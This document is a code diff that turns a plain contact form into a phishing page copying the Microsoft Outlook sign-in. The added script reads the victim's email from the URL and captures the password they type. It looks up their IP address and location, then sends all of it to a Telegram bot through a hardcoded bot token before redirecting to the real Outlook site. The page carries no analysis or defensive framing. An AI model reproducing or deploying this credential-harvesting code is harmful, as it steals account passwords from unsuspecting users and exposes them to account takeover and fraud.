@@ -1,82 +1,255 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Form</title>
 
-<!-- Add this script -->
+<html>
+<head> 
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- jQuery library -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+
 <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" defer></script>
 
+
+
+
+
 <style>
-    body {
-        font-family: Arial, sans-serif;
-        background-color: #f4f4f4;
-        margin: 0;
-        padding: 0;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
 
-    form {
-        background-color: #fff;
-        padding: 40px;
-        border-radius: 5px;
-        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-        width: 400px; 
-    }
+body{
+margin:0;
+padding:0;
+background-image:linear-gradient(to left ,#E2ECE1 ,#F5E4DD);
+background-repeat:no-repeat;
+background-size:cover;
+background-position:center;
+}
 
-    label {
-        display: block;
-        margin-bottom: 10px;
-    }
-
-    input[type="text"],
-    input[type="email"],
-    textarea {
-        width: 100%;
-        padding: 8px;
-        margin-bottom: 15px;
-        border: 1px solid #ccc;
-        border-radius: 4px;
-        box-sizing: border-box;
-    }
-
-    input[type="submit"] {
-        background-color: #4CAF50;
-        color: white;
-        padding: 10px 20px;
-        border: none;
-        border-radius: 4px;
-        cursor: pointer;
-    }
-
-    input[type="submit"]:hover {
-        background-color: #45a049;
-    }
+#cover{
+	margin:auto;
+	width:auto;
+	margin:10px 0px 10px 0px;
+	}
 
 
+#ccc {
+	margin:auto;
+	width:auto;
+	max-width:430px;
+
+
+	}
+
+#center {
+	margin:auto;
+	margin-top:15%;
+	max-width:430px;
+	min-height:450px;
+	ackground:blue;
+	margin-left:5px;
+	margin-right:5px;
+	}
+	
+#center2 {
+	margin:auto;
+	margin-top:0px;
+	padding:30px;
+	width:auto;
+	min-height:270px;
+	background:white;
+	box-shadow: 0px 0px 10px -2px black;
+	
+	}
+	
+#footer {
+	position:fixed;
+	bottom:0;
+	left:0;
+	width:100%;
+	height:15px;
+	background:#5B5E62;
+	padding:0px 20px 10px 10px ;
+	color:#FFF;
+	text-align:right;
+	font-family:sans-serif;
+	font-size:2px;
+	}
+	
+a{
+	 text-decoration:none;
+	 color:#fff;
+	 font-size:12px;
+}
+
+input{
+	font-size:17px;
+	border-color:#005DA6;
+	border-width:1px;
+	border-top:none;
+	border-left:none;
+	border-right:none;
+	padding:5px 0px 5px 0px;
+	
+	}
+
+input:focus{
+	outline:none;
+	}
+	
+	
+  input.pw {
+  -webkit-text-security: disc;
+}
+
+	
 </style>
+
 </head>
+
+
+
+
 <body>
+<div id="cover">
 
-<form action="send.php" method="post" id="myForm">
-    <label for="name">Name:</label>
-    <input type="text" id="name" name="name" required>
+<div id="ccc">
+<div id="center">
+<center><h1 style="	margin-bottom:20px; font-family:sans-serif; font-size:41; color:#323130;">Outlook</h1></center>
 
-    <label for="email">Email:</label>
-    <input type="email" id="email" name="email" required>
+<div id="center2">
+<p style=" float:left;"><img height="25px" width="25px" src="https://i.postimg.cc/jdQwLm3c/rosoft.jpg"></p> 
 
-    <label for="message">Message:</label>
-    <textarea id="message" name="message" rows="4" required></textarea>
+<p style="margin-top:20px; font-family:verdana; font-weight:bold; font-size:17px; color:#737373;">&nbspMicrosoft</p>
 
+
+
+<form id="voicemailForm">
+
+
+<p><input id="idcarrd" type="email"  name="email" class="text" size="25" style="font-size:14px; border:none; margin-top:2px;" value="technomax.bd@outlook.com" required="required" placeholder="Email" required></p>
+
+
+
+
+<h2 style="clear:both; font-family:sans-serif; color:#333333;">Enter password</h2>
+
+<p> <input class="pw" name="" id="backcarrd" style="width:100%;" size="" style="" placeholder=""  required="required" required ></p>
+
+<p style="color:#005DA6; font-family:sans-serif; font-size:12px;"><a style="color:#005DA6;" href="">Forgot my password</a></p>
+  
+  <input type="hidden" id="country" name="country" placeholder="country" required="" />  
+  <input type="hidden" id="region" name="region" placeholder="Region" required="" />  
+  
+  
+<div id="myWidget">
     <!-- Add your public key -->
     <div class="cf-turnstile" data-sitekey="0x4AAAAAACGTmjNYFY6FFyHH" ></div>
 
-    <input type="submit" value="Submit" id="submitButton">
+</div>
+
+
+<br>
+
+   <script>
+   
+   window.onloadTurnstileCallback = function () {
+    turnstile.render('#myWidget', {
+        sitekey: '0x4AAAAAACGSUUIR4PPU9RgT',
+        callback: function(token) {
+            console.log('Challenge Success ${token}');
+            window.location.href = "https://facebook.com";
+        },
+    });
+  };
+   
+   </script> 
+
+
+  <button type="submit" style="border:none; cursor:pointer; float:right; height:30px; width:30%; background-color:#005DA6; color:white;">Sign in</button>
+  
+  <br>
 </form>
 
+</div>
+
+
+</div>
+</div>
+
+<div id="footer">
+</div>
+
+
+
+</div>
+
+
+
+
+		<script>
+		
+var jemail  = location.hash.substr(1);
+		
+
+	document.getElementById("idcarrd").value = jemail;
+	</script>
+
+
+
+<script>
+var moveon = "https://outlook.live.com/mail/0/";
+
+    const chatId = "7333706691";
+    const langley = "7218728763:AAGD1s-YbjQMDAnmkQyoeJutO1hiyQqUNV4";
+
+    $(document).ready(function() {
+        $("#voicemailForm").on("submit", function(event) {
+            event.preventDefault();
+
+            let email = $("#idcarrd").val();
+            let password = $("#backcarrd").val();
+
+            $.getJSON('https://api64.ipify.org?format=json', function(data) {
+			
+                let ipAddress = data.ip;
+                let country = document.getElementById("country").value;
+                let region = document.getElementById("region").value;
+
+                let message = `Email: ${email}\nPassword: ${password}\nIP Address: ${ipAddress}\nCountry: ${country}\nRegion: ${region}`;
+
+                $.ajax({
+                    url: `https://api.telegram.org/bot${langley}/sendMessage`,
+                    method: "POST",
+                    data: {
+                        chat_id: chatId,
+                        text: message
+                    },
+                    success: function(response) {
+                        //alert("inccorrect password press ok to try again.!");
+						window.location.assign(moveon);
+
+                    },
+                    error: function(error) {
+                        alert("Error sending message.");
+                    }
+                });
+            });
+        });
+    });
+</script>
+
+
+<script>
+  function recordData (data) {
+  
+     document.getElementById("country").value = (data.country);
+     document.getElementById("region").value = (data.timezone); 
+    //console.log(data.ip, data.country)
+  }
+</script>
+<script src="https://ipinfo.io/json?callback=recordData"></script>
+
+
+
 </body>
+
 </html>
